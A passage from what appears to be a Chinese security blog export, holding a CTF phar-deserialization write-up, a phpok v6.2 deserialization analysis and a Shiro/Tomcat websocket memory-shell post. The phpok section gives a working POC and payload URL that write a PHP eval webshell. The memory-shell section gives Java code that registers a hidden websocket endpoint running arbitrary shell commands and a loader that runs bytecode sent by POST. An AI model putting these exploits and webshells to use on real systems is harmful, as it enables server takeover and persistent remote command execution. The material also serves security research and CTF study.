class=\"string\">&quot;\\n&quot;</span>.<span class=\"string\">&#x27;__HALT_COMPILER(); ?&gt;&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;setMetadata(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;addFromString(<span class=\"string\">&#x27;text.txt&#x27;</span>,<span class=\"string\">&#x27;test&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>\n\n<p>修改phar文件的序列化字符串</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E9%9A%8F%E6%89%8B%2Fimage-20220514181652751.png\" alt=\"image-20220514181652751\"></p>\n<p>运行py文件，产生重新计算签名的new.jpg，将其上传，利用查看文件处的 file_get__contents() 进行phar反序列化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">phar:&#x2F;&#x2F;.&#x2F;upload&#x2F;4kej0r03lvqb9o9n8t9pm9pm36&#x2F;new.jpg</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E9%9A%8F%E6%89%8B%2Fimage-20220514181818147.png\" alt=\"image-20220514181818147\"></p>\n<p>[<a href=\"https://www.wolai.com/k1he/iFdthhceLQBNqjotbQ7jFp\">NSSCTF]prize1(phar+强制GC) (wolai.com)</a></p>\n<p>[<a href=\"https://guokeya.github.io/post/1byvbzb_I/\">NCTF2019]phar matches everything(phar反序列化) | (guokeya.github.io)</a></p>\n<h1 id=\"二、\"><a href=\"#二、\" class=\"headerlink\" title=\"二、\"></a>二、</h1><p>源码类似于N1CTF-2021 easyphp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">class Logger&#123;</span><br><span class=\"line\">    private $filename;</span><br><span class=\"line\">    private $content;</span><br><span class=\"line\">    private $endContent;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct($filename,$endContent)&#123;</span><br><span class=\"line\">        $this-&gt;filename &#x3D; $filename;</span><br><span class=\"line\">        $this-&gt;endContent &#x3D; $endContent;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function info($content)&#123;</span><br><span class=\"line\">        !file_exists(dirname($this-&gt;filename)) ? mkdir(dirname($this-&gt;filename)) : &quot;&quot;;</span><br><span class=\"line\">        $content &#x3D; &quot;Type:INFO Messsage:$content&quot;;</span><br><span class=\"line\">        $file &#x3D; fopen($this-&gt;filename,&quot;a&quot;);</span><br><span class=\"line\">        fwrite($file,$content);</span><br><span class=\"line\">        fclose($file);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        $this-&gt;info($this-&gt;endContent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$time &#x3D; time();</span><br><span class=\"line\">$logger &#x3D; new Logger(&quot;log&#x2F;info.log&quot;,&quot;Close at $time&quot;);</span><br><span class=\"line\">$fileName &#x3D; $_POST[&#39;file&#39;];</span><br><span class=\"line\">$userName &#x3D; $_POST[&quot;name&quot;] ?? &quot;nothing&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (file_exists($fileName))&#123;</span><br><span class=\"line\">    echo &quot;File exists&quot;;</span><br><span class=\"line\">    $logger-&gt;info(&quot;$userName&quot;);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;File does not exist&quot;;</span><br><span class=\"line\">    $logger-&gt;info(&quot;$userName&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>一眼phar反序列化，但是：<strong>可控内容前后都有脏字符</strong></p>\n<p>有三种常见情况</p>\n<ul>\n<li><strong>zip格式</strong>：文件头尾都可以有脏字符，但phar无法解析</li>\n<li><strong>phar格式</strong>：必须控制文件尾，但不需要控制文件头。PHP在解析时会在文件内查找 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code> 这个标签，这个标签前面的内容可以为任意值，但后面的内容必须是phar格式，并以该文件的sha1签名与字符串<code>GBMB</code>结尾。</li>\n<li><strong>tar格式</strong>：必须控制文件头，即可构造合法的tar文件，即使文件尾有垃圾字符</li>\n</ul>\n<p>结合题目的话，文件尾肯定是最麻烦的，既然头部字段固定，那就生成一个正常tar格式文件，加入反序列化字符串后，切割截取后段部分，写入切割后的内容，一拼接形成一个合法tar文件</p>\n<p>直接上exp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">CLASS FLAG &#123;</span><br><span class=\"line\">    private $_flag&#x3D;&quot;flag&#123;aaaa&#125;&quot;;</span><br><span class=\"line\">    public function __wakeup()&#123;</span><br><span class=\"line\">        echo &quot;FLAG: &quot; . $this-&gt;_flag;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$log &#x3D; &#39;Type:INFO Messsage:&#39;;  &#x2F;&#x2F; 头部不可控的部分</span><br><span class=\"line\">$data_len &#x3D; strlen($log);</span><br><span class=\"line\"></span><br><span class=\"line\">if(!file_exists(&quot;.&#x2F;phar.tar&quot;))&#123;</span><br><span class=\"line\">    $phar &#x3D; new PharData(dirname(__FILE__) . &quot;&#x2F;phar.tar&quot;, 0, &quot;phartest&quot;, Phar::TAR);</span><br><span class=\"line\">    $phar-&gt;startBuffering();</span><br><span class=\"line\">    $o &#x3D; new FLAG();</span><br><span class=\"line\">    $phar-&gt;setMetadata($o);</span><br><span class=\"line\">    $phar-&gt;addFromString($log, &quot;test&quot;);</span><br><span class=\"line\">    $phar-&gt;stopBuffering();</span><br><span class=\"line\"></span><br><span class=\"line\">    file_put_contents(&quot;.&#x2F;phar.tar&quot;, &quot;]\\n&quot;, FILE_APPEND);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$exp &#x3D; file_get_contents(&quot;.&#x2F;phar.tar&quot;);</span><br><span class=\"line\">$post_exp &#x3D; substr($exp, $data_len);</span><br><span class=\"line\">echo rawurlencode($post_exp);   &#x2F;&#x2F;访问获取要传递的数据</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;var_dump(is_dir(&quot;phar:&#x2F;&#x2F;.&#x2F;phar.tar&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;var_dump(is_dir(&quot;phar:&#x2F;&#x2F;.&#x2F;..&#x2F;..&#x2F;www&#x2F;log&#x2F;127.0.0.1&#x2F;look_www.log&quot;));</span><br></pre></td></tr></table></figure>\n\n<p>然后 file=log/info.log&amp;name=数据 即可</p>\n<p><a href=\"https://forum.butian.net/share/1917\">Phar反序列化如何解决各种waf检测和脏数据的添加问题?</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/240007\">从一道题再看phar的利用</a></p>\n<p><a href=\"https://github.com/Nu1LCTF/n1ctf-2021/tree/main/Web/easyphp\">Nu1LCTF/n1ctf-2021</a></p>\n","categories":["赛题wp"]},{"title":"phpokv6.2前台反序列化","url":"/2023/12/25/phpok/","content":"<h1 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h1><p>phpok v6.2存在前台反序列化漏洞，可写入webshell</p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><p>这套cms的两个参数：c = 控制器   f = 函数</p>\n<p>framework\\api\\call_control.php#index</p>\n<p>data参数为json格式，解析之后不允许存在type_id</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192310421.png\" alt=\"image-20220823192310421\"></p>\n<p>往下进入framework\\phpok_tpl_helper.php#phpok函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192435631.png\" alt=\"image-20220823192435631\"></p>\n<p>调用framework\\phpok_call.php#phpok函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192513656.png\" alt=\"image-20220823192513656\"></p>\n<p>通过 parse_str 这里产生漏洞，控制了type_id参数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823192758472.png\" alt=\"image-20220823192758472\"></p>\n<p>接着根据$id即 m_picplayer 去获取一套模板数组$call_rs，再通过array_merge合并，导致type_id的值可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193211462.png\" alt=\"image-20220823193211462\"></p>\n<p>修改为 format_ext_all</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193416311.png\" alt=\"image-20220823193416311\"></p>\n<p>根据type_id的值加上下划线，构造出的函数名必须在这33个之中，这里还能挖掘其他32个函数的利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193544127.png\" alt=\"image-20220823193544127\"></p>\n<p>然后调用该函数就是存在反序列化的函数，跟着构造就完事了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193749126.png\" alt=\"image-20220823193749126\"></p>\n<h1 id=\"POP\"><a href=\"#POP\" class=\"headerlink\" title=\"POP\"></a>POP</h1><p>pop chain有手就行，全局搜索 __destruct() 发现 framework\\engine\\cache.php#__destruct() 存在save，而且两个参数都可控</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823193945436.png\" alt=\"image-20220823193945436\"></p>\n<p>文件名，文件内容都可控，就是加了一个exit，php://filter加编码器直接过</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823194026493.png\" alt=\"image-20220823194026493\"></p>\n<h1 id=\"POC\"><a href=\"#POC\" class=\"headerlink\" title=\"POC\"></a>POC</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">cache</span> </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$folder</span> = <span class=\"string\">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=D:/phpstudy_pro/WWW/docker/smity2/html/&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$key_id</span> = <span class=\"string\">&#x27;shell&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$key_list</span> = <span class=\"string\">&#x27;aaaaaIDw/cGhwIGV2YWwoJF9QT1NUW2NtZF0pOz8+&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$exp</span> = urlencode(urlencode(serialize(<span class=\"keyword\">new</span> cache())));</span><br><span class=\"line\"><span class=\"keyword\">echo</span>(<span class=\"variable\">$exp</span>); </span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;api.php?c&#x3D;call&amp;f&#x3D;index&amp;data&#x3D;&#123;&quot;m_picplayer&quot;: &quot;0%26type_id%3Dformat_ext_all%26x%5Bform_type%5D%3Durl%26x%5Bcontent%5D%3DO%253A5%253A%2522cache%2522%253A3%253A%257Bs%253A6%253A%2522folder%2522%253Bs%253A107%253A%2522php%253A%252F%252Ffilter%252Fwrite%253Dstring.strip_tags%257Cconvert.base64-decode%252Fresource%253DD%253A%252Fphpstudy_pro%252FWWW%252Fdocker%252Fsmity2%252Fhtml%252F%2522%253Bs%253A6%253A%2522key_id%2522%253Bs%253A5%253A%2522shell%2522%253Bs%253A8%253A%2522key_list%2522%253Bs%253A41%253A%2522aaaaaIDw%252FcGhwIGV2YWwoJF9QT1NUW2NtZF0pOz8%252B%2522%253B%257D&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/phpok/image-20220823200533226.png\" alt=\"image-20220823200533226\"></p>\n","categories":["代码审计"]},{"title":"shiro-websocket内存马","url":"/2023/12/25/shiro-memshell/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC%2F6193d09c503d8e057afa1636_Java%20code%20review%20checklist-min-p-1600.jpeg\" alt=\"6193d09c503d8e057afa1636_Java code review checklist-min-p-1600\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>新坑，关于shiro下注入内存马相关，起因有个师傅问我这么个情况：tomcat环境下shiro打CB反序列化的websocket内存马。调试后发现关于shiro这方面历史知识有点欠缺。</p>\n<h1 id=\"坑点总结\"><a href=\"#坑点总结\" class=\"headerlink\" title=\"坑点总结\"></a>坑点总结</h1><h2 id=\"maxHeaderSize长度绕过\"><a href=\"#maxHeaderSize长度绕过\" class=\"headerlink\" title=\"maxHeaderSize长度绕过\"></a>maxHeaderSize长度绕过</h2><p>三种方案</p>\n<p>1）修改maxHttpHeaderSize</p>\n<p><a href=\"http://wjlshare.com/archives/1545\">Shiro 550 漏洞学习 (二)：内存马注入及回显</a>，直接修改</p>\n<p>2）将class bytes使用gzip+base64压缩编码</p>\n<p><a href=\"https://mp.weixin.qq.com/s/fFYTRrSMjHnPBPIaVn9qMg\">tomcat结合shiro无文件webshell的技术研究以及检测方法</a>，将恶意byte压缩，在payload中调用classloader解压缩执行</p>\n<p>3）从POST请求体中发送字节码数据</p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247484622&idx=1&sn=8ec625711dcf87f0b6abe67483f0534d\">Java代码执行漏洞中类动态加载的应用</a></p>\n<h2 id=\"context与request获取\"><a href=\"#context与request获取\" class=\"headerlink\" title=\"context与request获取\"></a>context与request获取</h2><p>老生常谈了</p>\n<p><a href=\"https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE\">Shiro 回显与内存马实现 | MYZXCG</a></p>\n<p><a href=\"https://xz.aliyun.com/t/9914#toc-0\">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3\">基于全局储存的新思路 | Tomcat的一种通用回显方法研究</a></p>\n<p><a href=\"https://www.cnblogs.com/nice0e3/p/14891711.html\">Java安全之反序列化回显与内存马</a></p>\n<h1 id=\"问题发现\"><a href=\"#问题发现\" class=\"headerlink\" title=\"问题发现\"></a>问题发现</h1><p>CB链是调用TemplatesImpl进行加载字节码，流程为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">TemplatesImpl#newTransformer() -&gt;</span><br><span class=\"line\">TemplatesImpl#getTransletInstance() -&gt;</span><br><span class=\"line\">TemplatesImpl#defineTransletClasses() -&gt;</span><br><span class=\"line\">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>\n\n<p>该字节码所对应的类必须继承于 <code>AbstractTranslet</code>，但是websocket内存马的实现也是需要一个类去继承于 <code>Endpoint</code> 。这种情况该怎么去构造？</p>\n<h1 id=\"尝试解决\"><a href=\"#尝试解决\" class=\"headerlink\" title=\"尝试解决\"></a>尝试解决</h1><h2 id=\"内部类\"><a href=\"#内部类\" class=\"headerlink\" title=\"内部类\"></a>内部类</h2><p>利用内部类尝试写入</p>\n<p>websocket.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.catalina.core.StandardContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.DeploymentException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.Endpoint;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.EndpointConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.Session;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.server.ServerContainer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">websocket</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractTranslet</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">socket</span> <span class=\"keyword\">extends</span> <span class=\"title\">Endpoint</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Session session;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onOpen</span><span class=\"params\">(Session session, EndpointConfig config)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.session = session;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.session.addMessageHandler(<span class=\"keyword\">new</span> MessageHandler());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MessageHandler</span> <span class=\"keyword\">implements</span> <span class=\"title\">javax</span>.<span class=\"title\">websocket</span>.<span class=\"title\">MessageHandler</span>.<span class=\"title\">Whole</span>&lt;<span class=\"title\">String</span>&gt; </span>&#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onMessage</span><span class=\"params\">(String message)</span> </span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">boolean</span> iswin = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().startsWith(<span class=\"string\">&quot;windows&quot;</span>);</span><br><span class=\"line\">                    Process exec;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (iswin) &#123;</span><br><span class=\"line\">                        exec = Runtime.getRuntime().exec(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, message&#125;);</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                        exec = Runtime.getRuntime().exec(<span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;/bin/bash&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, message&#125;);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    InputStream ips = exec.getInputStream();</span><br><span class=\"line\">                    StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">                    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span>((i = ips.read()) != -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                        sb.append((<span class=\"keyword\">char</span>)i);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    ips.close();</span><br><span class=\"line\">                    exec.waitFor();</span><br><span class=\"line\">                    session.getBasicRemote().sendText(sb.toString());</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]-------before exp-------&quot;</span>);</span><br><span class=\"line\">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class=\"line\">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class=\"line\">        System.out.println(standardContext);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;---------standardContext-------&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        WsServerContainer attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());</span><br><span class=\"line\">        System.out.println(attribute);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;---------attribute-------&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        socket so = <span class=\"keyword\">new</span> websocket().<span class=\"function\">new <span class=\"title\">socket</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">        ServerEndpointConfig build = ServerEndpointConfig.Builder.create(so.getClass(), <span class=\"string\">&quot;/login.jsp&quot;</span>).build();</span><br><span class=\"line\">        System.out.println(build);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;---------build-------&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;[+]------after exp------&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            attribute.addEndpoint(build);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;ok!&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (DeploymentException e) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, SerializationHandler[] handlers)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">transform</span><span class=\"params\">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class=\"keyword\">throws</span> TransletException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>尝试很多次都是在创建 <code>ServerEndpointConfig</code> 时失败，具体原因先跳过。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/shiro-memshell/image-20221207005409100.png\" alt=\"image-20221207005409100\"></p>\n<h2 id=\"自定义Classloader\"><a href=\"#自定义Classloader\" class=\"headerlink\" title=\"自定义Classloader\"></a>自定义Classloader</h2><p>能不能将payload和exp分开，CB链目的是去动态加载我们传入的字节码，socket内存马的字节码我们可以通过POST方式去获取。中间桥梁可以通过类加载的操作去实现。</p>\n<p>通过 <code>Tomcat的一种通用回显方法研究</code> ，只需要拿到request就可了。</p>\n<p>exp.java</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\">import org.apache.catalina.connector.Connector;</span><br><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.core.ApplicationContext;</span><br><span class=\"line\">import org.apache.catalina.core.StandardContext;</span><br><span class=\"line\">import org.apache.catalina.core.StandardService;</span><br><span class=\"line\">import org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class=\"line\">import org.apache.coyote.AbstractProtocol;</span><br><span class=\"line\">import org.apache.coyote.RequestGroupInfo;</span><br><span class=\"line\">import org.apache.coyote.RequestInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.lang.reflect.InvocationTargetException;</span><br><span class=\"line\">import java.lang.reflect.Method;</span><br><span class=\"line\">import java.nio.charset.StandardCharsets;</span><br><span class=\"line\">import java.util.ArrayList;</span><br><span class=\"line\">import java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\">public class exp extends AbstractTranslet &#123;</span><br><span class=\"line\">    public static class TestClassLoader extends ClassLoader&#123;</span><br><span class=\"line\">        public Class x(byte[] bytes)&#123;</span><br><span class=\"line\">            return super.defineClass(null,bytes,0,bytes.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try&#123;</span><br><span class=\"line\">            &#x2F;&#x2F;获取service属性</span><br><span class=\"line\">            StandardContext standardContext&#x3D; (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();</span><br><span class=\"line\">            Field context&#x3D;Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">            context.setAccessible(true);</span><br><span class=\"line\">            ApplicationContext applicationContext&#x3D; (ApplicationContext) context.get(standardContext);</span><br><span class=\"line\">            Field servicef&#x3D;applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">            servicef.setAccessible(true);</span><br><span class=\"line\">            StandardService service&#x3D;(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#x2F;&#x2F;获取connector</span><br><span class=\"line\">            Connector[] connectors&#x3D;service.findConnectors();</span><br><span class=\"line\">            Connector connector&#x3D;connectors[0];</span><br><span class=\"line\"></span><br><span class=\"line\">            &#x2F;&#x2F;获取global</span><br><span class=\"line\">            AbstractProtocol abstractProtocol&#x3D; (AbstractProtocol) connector.getProtocolHandler();</span><br><span class=\"line\">            Method getHandler&#x3D;Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredMethod(&quot;getHandler&quot;);</span><br><span class=\"line\">            getHandler.setAccessible(true);</span><br><span class=\"line\">            Object connectionHandler&#x3D;getHandler.invoke(abstractProtocol);</span><br><span class=\"line\">            Method getGlobal&#x3D;Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredMethod(&quot;getGlobal&quot;);</span><br><span class=\"line\">            RequestGroupInfo global&#x3D; (RequestGroupInfo) getGlobal.invoke(connectionHandler);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#x2F;&#x2F;获取request</span><br><span class=\"line\">            Field processorsf&#x3D;Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);</span><br><span class=\"line\">            processorsf.setAccessible(true);</span><br><span class=\"line\">            ArrayList&lt;RequestInfo&gt; processors&#x3D; (ArrayList&lt;RequestInfo&gt;) processorsf.get(global);</span><br><span class=\"line\">            RequestInfo requestInfo&#x3D;processors.get(0);</span><br><span class=\"line\">            Field req&#x3D;Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);</span><br><span class=\"line\">            req.setAccessible(true);</span><br><span class=\"line\">            Request request2&#x3D;(Request) ((org.apache.coyote.Request) req.get(requestInfo)).getNote(1);</span><br><span class=\"line\">            byte[] bytes&#x3D;Base64.getDecoder().decode(request2.getParameter(&quot;code&quot;).getBytes(StandardCharsets.UTF_8));</span><br><span class=\"line\">            Method defineClass&#x3D;Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);</span><br><span class=\"line\">            defineClass.setAccessible(true);</span><br><span class=\"line\">            Class x&#x3D; (Class) defineClass.invoke(exp.class.getClassLoader(),bytes,0,bytes.length);</span><br><span class=\"line\">            x.newInstance();</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException 